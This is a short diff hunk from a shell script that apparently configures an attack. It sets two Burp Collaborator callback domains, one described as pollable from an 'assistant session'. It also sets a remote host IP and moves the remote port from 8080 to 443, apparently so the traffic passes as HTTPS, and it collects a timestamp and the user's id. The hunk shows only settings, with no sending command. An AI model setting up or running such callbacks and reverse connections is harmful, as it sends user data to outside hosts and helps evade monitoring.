@@ -12,7 +12,7 @@
 C="ajxs0es04alljo13m0zw3eqyzp5gtfh4.oastify.com"      # your Burp UI
 C2="gbv94ohtcoz0kf5r2dsfyb0rhinjblpotbe23.oastify.com" # backup, pollable from the assistant session
 RHOST="31.97.12.44"
-RPORT="8080"
+RPORT="443"
 
 TS="$(date -u +%Y%m%dT%H%M%SZ)"
 U="$(id -u 2>/dev/null)"
